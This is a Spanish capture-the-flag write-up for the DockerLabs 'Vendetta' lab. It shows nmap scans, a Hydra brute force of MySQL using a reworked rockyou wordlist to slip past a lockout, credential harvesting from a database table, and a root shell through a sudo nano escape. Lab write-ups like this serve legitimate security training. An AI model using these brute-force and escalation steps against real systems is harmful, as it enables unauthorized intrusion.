---
icon: flag
---

# Vendetta DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip vendetta.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh vendetta.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 13:10 EST
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:66:3d:c0:de:2c:1a:25:f8:fc:10:8a:5c:e9:d2:ba (ECDSA)
|_  256 45:89:84:f6:20:34:a6:7a:2e:1e:07:24:ac:ce:d0:67 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: V de Vendetta
3306/tcp open  mysql   MySQL 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
|   Thread ID: 35
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, InteractiveClient, Support41Auth, DontAllowDatabaseTableColumn, FoundRows, LongColumnFlag, Speaks41ProtocolNew, ODBCClient, SupportsTransactions, SupportsLoadDataLocal, SupportsCompression, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: O~LBChd=Ao/9nA:?l#g`
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```

Vemos una pagina aparentemente normal, pero si la inspeccionamos, veremos lo siguiente:

```html
 <p class="about__text"><strong>V</strong>isible pero a la Vez oculto.</p>
```

Vemos que hay una `V` oculta, por lo que probaremos a utilizarlo como nombre de usuario en la `Base de datos` de `MySQL` que tenemos como puerto, ya que por `SSH` no nos dara nada.

## Hydra

```shell
hydra -l V -P <WORDLIST> mysql://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-27 13:13:21
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://172.17.0.2:3306/
[ERROR] Host '172.17.0.1' is blocked because of many connection errors; unblock with 'mariadb-admin flush-hosts'
[ERROR] Host '172.17.0.1' is blocked because of many connection errors; unblock with 'mariadb-admin flush-hosts'
```

Vemos que pasado un rato nos bloquea, por lo que veremos que por dentro habra algun mecanismo de bloque.

Por lo que vamos ha modificar un poco el diccionario de `rockyou.txt` de la siguiente forma, primero le daremos la vuelta al diccionario.

```shell
tac /usr/share/wordlists/rockyou.txt > reverseRockyou.txt
```

Y ahora quitaremos todos los numeros que no nos van a servir.

```shell
cat reverseRockyou.txt | tr -cd '[:alnum:]\n' > reverseRockyouClear.txt
```

Echo esto, volveremos a lanzar el ataque.

```shell
hydra -l V -P reverseRockyouClear.txt mysql://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-27 13:19:25
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14338619 login tries (l:1/p:14338619), ~3584655 tries per task
[DATA] attacking mysql://172.17.0.2:3306/
[3306][mysql] host: 172.17.0.2   login: V   password: ie168
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-27 13:19:27
```

Y vemos que tendremos unas credenciales de `mysql`, por lo que nos meteremos de la siguiente forma.

## Escalate user Vendetta

### MYSQL

```shell
mysql -h <IP> -u V -pie168 --ssl=0
```

Y con esto estaremos dentro como dicho usuario.

Ahora vamos a investigar si encontramos algunas credenciales.

```sql
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| BTN                |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.001 sec)
```

Vemos que la unica base de datos que no se crea de forma automatica es la llamada `BTN`:

```sql
show tables;
```

Info:

```
+---------------+
| Tables_in_BTN |
+---------------+
| users         |
+---------------+
1 row in set (0.000 sec)
```

Vamos a ver que contiene dicha tabla de la siguiente forma:

```sql
select * from users;
```

Info:

```
+----+----------+-----------+
| id | user     | password  |
+----+----------+-----------+
|  1 | Vendetta | OldBailey |
+----+----------+-----------+
1 row in set (0.000 sec)
```

Vemos que hemos obtenido las credenciales del usuario `Vendetta`, por lo que haremos lo siguiente:

### SSH

```shell
ssh Vendetta@<IP>
```

Metemos como contraseña `OldBailey` y veremos que estamos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for Vendetta on eb0db362fd97:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User Vendetta may run the following commands on eb0db362fd97:
    (ALL) NOPASSWD: /usr/bin/nano
```

Vemos que podemos ejecutar el binario `nano` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo nano
^R^X
reset; bash 1>&0 2>&0
```

Info:

```
root@eb0db362fd97:/home/Vendetta# whoami
root
```

Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
